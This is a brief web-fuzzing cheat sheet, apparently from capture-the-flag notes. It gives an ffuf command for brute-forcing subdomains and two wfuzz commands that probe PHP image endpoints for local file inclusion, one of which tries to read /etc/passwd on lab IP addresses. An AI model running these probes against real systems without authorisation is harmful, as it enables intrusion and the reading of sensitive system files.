---
title: Fuzzing
permalink: /Web/Fuzzing
---


# Check subdomains

```ffuf -u http://$BOX -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$BOX" -mc 200```  

## Ffuf has a -recursive option


# Injections PHP
```wfuzz -c --hc=404 -w /SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://10.129.175.50/images.php?img=FUZZ```
```wfuzz -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -t 50 --hh 0```
